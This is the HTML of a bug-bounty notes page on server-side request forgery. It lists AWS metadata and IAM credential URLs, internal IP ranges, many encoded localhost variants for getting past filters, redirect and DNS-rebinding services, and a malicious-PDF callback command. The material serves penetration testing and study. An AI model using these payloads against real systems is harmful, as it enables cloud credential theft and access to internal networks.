<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="SSRF # Sometimes sites offer the possibility to make external requests using their server, what if we could user their “external” service to make requests for internal resources. That’s SSRF.
If the site is hosted in amazon, it is possible to get internal information by requesting the urls:
http://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/user-data/ http://169.254.169.254/latest/meta-data/iam/security-credentials/flaws/ http://169.254.169.254/latest/meta-data/hostname http://169.254.169.254/latest/meta-data/iam/securty-credentials Another idea is to try and request IP’s that we know that are internal:
10.0.0.0 to 10.">
<meta name="theme-color" content="#FFFFFF">
<meta name="color-scheme" content="light dark"><meta property="og:title" content="" />
<meta property="og:description" content="SSRF # Sometimes sites offer the possibility to make external requests using their server, what if we could user their “external” service to make requests for internal resources. That’s SSRF.
If the site is hosted in amazon, it is possible to get internal information by requesting the urls:
http://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/user-data/ http://169.254.169.254/latest/meta-data/iam/security-credentials/flaws/ http://169.254.169.254/latest/meta-data/hostname http://169.254.169.254/latest/meta-data/iam/securty-credentials Another idea is to try and request IP’s that we know that are internal:
10.0.0.0 to 10." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://caon.io/docs/exploitation/ssrf/" /><meta property="article:section" content="docs" />

<meta property="article:modified_time" content="2023-05-21T15:21:05-03:00" />
<title>Ssrf | caon.io</title>
<link rel="manifest" href="/manifest.json">
<link rel="icon" href="/favicon.png" type="image/x-icon">
<link rel="stylesheet" href="/book.min.46181bc93375ba932026e753b37c40e6ff8bb16a9ef770c78bcc663e4577b1ba.css" integrity="sha256-RhgbyTN1upMgJudTs3xA5v&#43;LsWqe93DHi8xmPkV3sbo=" crossorigin="anonymous">
  <script defer src="/flexsearch.min.js"></script>
  <script defer src="/en.search.min.8b1cb1113427a6a81ff33b4f0a2baf0c04757c9052f0f11fbed87257bd502cfe.js" integrity="sha256-ixyxETQnpqgf8ztPCiuvDAR1fJBS8PEfvthyV71QLP4=" crossorigin="anonymous"></script>

<script async src="https://www.googletagmanager.com/gtag/js?id=G-YNBNGF8X6V"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-YNBNGF8X6V', { 'anonymize_ip': false });
}
</script>
<!--
Made with Book Theme
https://github.com/alex-shpak/hugo-book
-->
  
</head>
<body dir="ltr">
  <input type="checkbox" class="hidden toggle" id="menu-control" />
  <input type="checkbox" class="hidden toggle" id="toc-control" />
  <main class="container flex">
    <aside class="book-menu">
      <div class="book-menu-content">
        
  <nav>
<h2 class="book-brand">
  <a class="flex align-center" href="/"><span>caon.io</span>
  </a>
</h2>


<div class="book-search">
  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
  <div class="book-search-spinner hidden"></div>
  <ul id="book-search-results"></ul>
</div>












  <ul>
<li>
<p><strong>Recon</strong></p>
</li>
<li>
<p><a href="/docs/recon/scope/">Scope</a></p>
</li>
<li>
<p><a href="/docs/recon/asncidr/">ASN/CIDR</a></p>
</li>
<li>
<p>Subdomain Enumeration</p>
<ul>
<li><a href="/docs/recon/subdomain/passive/">Passive</a></li>
<li><a href="/docs/recon/subdomain/active/">Active</a></li>
</ul>
</li>
<li>
<p><a href="/docs/recon/portscan/">Port Scan</a></p>
</li>
<li>
<p><a href="/docs/recon/probing/">Probing</a></p>
</li>
<li>
<p><a href="/docs/recon/screenshot/">Screenshot</a></p>
</li>
<li>
<p><a href="/docs/recon/wafcheck/">WAF Check</a></p>
</li>
<li>
<p>Content Discovery</p>
<ul>
<li><a href="/docs/recon/dorks/">Dorking</a></li>
<li><a href="/docs/recon/spider/">Spidering</a></li>
<li><a href="/docs/recon/fuzzing/">Fuzzing</a></li>
<li><a href="/docs/recon/paramdiscovery/">Params</a></li>
<li><a href="/docs/recon/thirdparty/">Third Party</a></li>
</ul>
</li>
<li>
<p><a href="/docs/recon/wordlistgeneration/">Wordlist Generation</a></p>
</li>
</ul>
<br />
<ul>
<li>
<p><strong>Exploitation</strong></p>
</li>
<li>
<p>Bypass</p>
<ul>
<li><a href="/docs/exploitation/403bypass/">403 Bypass</a></li>
<li><a href="/docs/exploitation/wafbypass/">WAF Bypass</a></li>
</ul>
</li>
<li>
<p>Authentication</p>
<ul>
<li><a href="/docs/exploitation/auths/jwt/">JWT</a></li>
<li><a href="/docs/exploitation/auths/oauth/">OAuth 2</a></li>
<li><a href="/docs/exploitation/auths/twofa/">2FA Auth</a></li>
<li><a href="/docs/exploitation/auths/saml/">SAML</a></li>
</ul>
</li>
<li>
<p>Cloud</p>
<ul>
<li><a href="/docs/exploitation/cloud/aws/">Amazon</a></li>
<li><a href="/docs/exploitation/cloud/azure/">Azure</a></li>
<li><a href="/docs/exploitation/cloud/google/">Google</a></li>
</ul>
</li>
<li>
<p>CMS</p>
<ul>
<li><a href="/docs/exploitation/cms/drupal/">Drupal</a></li>
<li><a href="/docs/exploitation/cms/wordpress/">Wordpress</a></li>
<li><a href="/docs/exploitation/cms/others/">Others</a></li>
</ul>
</li>
<li>
<p>Vulnerabilities</p>
<ul>
<li>
<p><a href="/docs/exploitation/cachepoisoning/">Cache poisoning</a></p>
</li>
<li>
<p><a href="/docs/exploitation/clickjacking/">Clickjacking</a></p>
</li>
<li>
<p><a href="/docs/exploitation/commandinjection/">Command Injection</a></p>
</li>
<li>
<p><a href="/docs/exploitation/cookieattacks/">Cookie Based Attacks</a></p>
</li>
<li>
<p><a href="/docs/exploitation/crlf/">CRLF</a></p>
</li>
<li>
<p><a href="/docs/exploitation/csrf/">CSRF</a></p>
</li>
<li>
<p><a href="/docs/exploitation/cors/">CORS</a></p>
</li>
<li>
<p><a href="/docs/exploitation/deserialization/">Deserialization</a></p>
</li>
<li>
<p><a href="/docs/exploitation/hostheaderinjection/">Host Header Injection</a></p>
</li>
<li>
<p><a href="/docs/exploitation/idor/">IDOR</a></p>
</li>
<li>
<p><a href="/docs/exploitation/lfi/">LFI</a></p>
</li>
<li>
<p><a href="/docs/exploitation/openredirect/">Open Redirect</a></p>
</li>
<li>
<p><a href="/docs/exploitation/parameterpollution/">Parameter Pollution</a></p>
</li>
<li>
<p><a href="/docs/exploitation/pathtransversal/">Path Transversal</a></p>
</li>
<li>
<p><a href="/docs/exploitation/prototypepollution/">Prototype Pollution</a></p>
</li>
<li>
<p><a href="/docs/exploitation/requestsmuggling/">Request Smuggling</a></p>
</li>
<li>
<p><a href="/docs/exploitation/rce/">RCE</a></p>
</li>
<li>
<p><a href="/docs/exploitation/ssti/">SSTI</a></p>
</li>
<li>
<p><a href="/docs/exploitation/ssrf/"class=active>SSRF</a></p>
</li>
<li>
<p><a href="/docs/exploitation/sqli/">SQLi</a></p>
</li>
<li>
<p><a href="/docs/exploitation/xss/">XSS</a></p>
</li>
<li>
<p><a href="/docs/exploitation/xxe/">XXE</a></p>
</li>
</ul>
</li>
<li>
<p>Workflows</p>
<ul>
<li><a href="/docs/exploitation/workflows/payment/">Payment</a></li>
</ul>
</li>
<li>
<p>Other</p>
<ul>
<li><a href="/docs/exploitation/other/passwordbruteforce/">Password Brute Force</a></li>
<li><a href="/docs/exploitation/other/javascriptfiles/">Javascript Analysys</a></li>
<li><a href="/docs/exploitation/other/uuid/">UUID</a></li>
<li><a href="/docs/exploitation/other/webtech/">Web technologies</a></li>
</ul>
</li>
</ul>
<br />
<ul>
<li><strong>Resources</strong></li>
<li><a href="/docs/resources/regexes/">Regexes</a></li>
<li><a href="/docs/resources/burp/">Burp Suite</a></li>
<li><a href="/docs/resources/sites/">Sites</a></li>
<li><a href="/docs/resources/youtubechannels/">Youtube channels</a></li>
<li><a href="/docs/resources/writeups/">Great Writeups</a></li>
<li><a href="/docs/resources/tools/">Web Tools</a></li>
<li><a href="/docs/resources/repositories/">Repositories</a></li>
<li><a href="/docs/resources/career/">Career</a></li>
</ul>
<br />






  
<ul>
  
  <li>
    <a href="https://github.com/felipecaon" target="_blank" rel="noopener">
        Github
      </a>
  </li>
  
</ul>






</nav>




  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>


 
      </div>
    </aside>

    <div class="book-page">
      <header class="book-header">
        
  <div class="flex align-center justify-between">
  <label for="menu-control">
    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
  </label>

  <strong>Ssrf</strong>

  <label for="toc-control">
    
    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
    
  </label>
</div>


  
  <aside class="hidden clearfix">
    
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#ssrf">SSRF</a>
      <ul>
        <li><a href="#ip-converter">IP Converter</a></li>
        <li><a href="#redirect-from-one-url-to-another">Redirect from one URL to another</a></li>
        <li><a href="#dns-rebinding">DNS Rebinding</a></li>
        <li><a href="#using-enclosed-alphanumerics">Using enclosed alphanumerics</a></li>
        <li><a href="#cloud-meadata">Cloud Meadata</a></li>
        <li><a href="#pdf">PDF</a></li>
        <li><a href="#mindmap">Mindmap</a></li>
        <li><a href="#articles">Articles</a></li>
      </ul>
    </li>
  </ul>
</nav>



  </aside>
  
 
      </header>

      
      
  <article class="markdown"><h1 id="ssrf">
  SSRF
  <a class="anchor" href="#ssrf">#</a>
</h1>
<p>Sometimes sites offer the possibility to make external requests using their server, what if we could user their “external” service to make requests for internal resources. That’s SSRF.</p>
<p>If the site is hosted in amazon, it is possible to get internal information by requesting the urls:</p>
<pre tabindex="0"><code>http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/flaws/
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/iam/securty-credentials
</code></pre><p>Another idea is to try and request IP’s that we know that are internal:</p>
<pre tabindex="0"><code>10.0.0.0 to 10.255.255.55
100.64.0.0 to 10.127.255.255
127.0.0.0 to 127.255.255.255
127.16.0.0 to 127.31.255.255
192.0.0.0 to 192.0.0.255
198.18.0.0 to 198.19.255.255
</code></pre><p>Sometimes websites block external acess to localhost (ie 127.0.0.1). Fortunately it is possible to bypass restrictions by referencing localhost in other ways.</p>
<p>Did you know that <code>127.0.0.1</code> and <code>127.1</code> are the same thing?</p>
<pre tabindex="0"><code>127.0.0.1
127.0.0.2
127.1
127.2
::1
0:0:0:0:0:0:0:1
0:0:0:000:0:0:0:1
0000:0000:0000:0000:0000:0000:0000:0001
2130706433
2130706434
7F000001
7F000002
localhos
127.123.123.123
0x7f.1
017700000001
127.0.0.1
localhost
0x7f.0x0.0x0.0x1
0177.00.00.01
017700000001
0x7f001
2130706433
017700000001
%6c%6f%63%61%6c%68%6f%73%74
%31%32%37%2e%30%2e%30%2e%31
0x7f000001
00000000177.000000000.000000000.000000001
0x7f.0x0.0x0.0x1
0x000000007f.0x000000000.0x000000000.0x000000001
0x7f.0x0.0x0.1
0x7f.0x0.0.1
0x7f.0.0.1
127.0x0.0x0.0x1
127.0.0x0.0x1
127.0.0.0x1
0177.00.00.1
0177.00.0.1
0177.0.0.1
127.00.00.01
127.0.00.01
127.0.0.01
0x7f.0x0.1
0x7f.1
0177.00.1
0177.1
0x7f.00.1
0177.0x0.1
::ffff:7f000001
0:0:0:0:0:ffff:7f000001
0000:0000:0000:0000:0000:ffff:7f000001
0000:0000:0000:0000:0000:ffff:127.0.0.1
hostname
0177.1
0177.2
0177.0.1
0177.0.2
017700000001
017700000002
0x7F000001
0x7F000002
0X07f.0.0.1
</code></pre><h2 id="ip-converter">
  IP Converter
  <a class="anchor" href="#ip-converter">#</a>
</h2>
<ul>
<li><a href="https://h.43z.one/ipconverter/">https://h.43z.one/ipconverter/</a></li>
</ul>
<h2 id="redirect-from-one-url-to-another">
  Redirect from one URL to another
  <a class="anchor" href="#redirect-from-one-url-to-another">#</a>
</h2>
<ul>
<li><a href="https://ssrf.localdomain.pw">https://ssrf.localdomain.pw</a></li>
</ul>
<pre tabindex="0"><code>https://ssrf.localdomain.pw/csv-with-body/301-http-169.254.169.254:80-.c.csv
https://ssrf.localdomain.pw/img-with-body/301-http-169.254.169.254:80-.i.jpg
</code></pre><ul>
<li><a href="https://sslip.io/">https://sslip.io/</a></li>
</ul>
<h2 id="dns-rebinding">
  DNS Rebinding
  <a class="anchor" href="#dns-rebinding">#</a>
</h2>
<p>To put it super simply, DNS rebinding allows you to have a hostname that switches between 2 ips with a very low ttl. This can bypass SSRF protections by resolving as a “safe” ip at first, then immediately switching to an “unsafe” or internal ip.</p>
<ul>
<li><a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></li>
</ul>
<h2 id="using-enclosed-alphanumerics">
  Using enclosed alphanumerics
  <a class="anchor" href="#using-enclosed-alphanumerics">#</a>
</h2>
<pre tabindex="0"><code>http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
</code></pre><p>Convert to unicode: <a href="http://qaz.wtf/u/convert.cgi">http://qaz.wtf/u/convert.cgi</a></p>
<h2 id="cloud-meadata">
  Cloud Meadata
  <a class="anchor" href="#cloud-meadata">#</a>
</h2>
<p>Interactsh server supports DNS records for cloud metadata services, which is useful for testing SSRF-related vulnerabilities.</p>
<pre><code>aws.interact.sh points to 169.254.169.254
alibaba.interact.sh points to 100.100.100.200
</code></pre>
<h2 id="pdf">
  PDF
  <a class="anchor" href="#pdf">#</a>
</h2>
<pre tabindex="0"><code># https://github.com/jonaslejon/malicious-pdf
python3 malicious-pdf.py burp-collaborator-url
</code></pre><h2 id="mindmap">
  Mindmap
  <a class="anchor" href="#mindmap">#</a>
</h2>
<p><img src="/ssrf_mindmap.png" alt="SSRF Mindmap" /></p>
<h2 id="articles">
  Articles
  <a class="anchor" href="#articles">#</a>
</h2>
<table>
<thead>
<tr>
<th>WriteUp</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://dant0x65.medium.com/bug-bounty-tip-automating-ssrf-ea344ec59962">https://dant0x65.medium.com/bug-bounty-tip-automating-ssrf-ea344ec59962</a></td>
<td>Configure burp to look for SSRFs</td>
</tr>
<tr>
<td><a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery">https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery</a></td>
<td>All about SSRF</td>
</tr>
<tr>
<td><a href="https://github.com/jdonsec/AllThingsSSRF">https://github.com/jdonsec/AllThingsSSRF</a></td>
<td>All Things SSRF</td>
</tr>
<tr>
<td><a href="https://github.com/assetnote/blind-ssrf-chains">https://github.com/assetnote/blind-ssrf-chains</a></td>
<td>Blind SSRF Chains</td>
</tr>
</tbody>
</table>
</article>
 
      

      <footer class="book-footer">
        
  <div class="flex flex-wrap justify-between">





</div>



  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>


 
        
      </footer>

      
  
 

      <label for="menu-control" class="hidden book-menu-overlay"></label>
    </div>

    
    <aside class="book-toc">
      <div class="book-toc-content">
        
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#ssrf">SSRF</a>
      <ul>
        <li><a href="#ip-converter">IP Converter</a></li>
        <li><a href="#redirect-from-one-url-to-another">Redirect from one URL to another</a></li>
        <li><a href="#dns-rebinding">DNS Rebinding</a></li>
        <li><a href="#using-enclosed-alphanumerics">Using enclosed alphanumerics</a></li>
        <li><a href="#cloud-meadata">Cloud Meadata</a></li>
        <li><a href="#pdf">PDF</a></li>
        <li><a href="#mindmap">Mindmap</a></li>
        <li><a href="#articles">Articles</a></li>
      </ul>
    </li>
  </ul>
</nav>


 
      </div>
    </aside>
    
  </main>

  
</body>
</html>












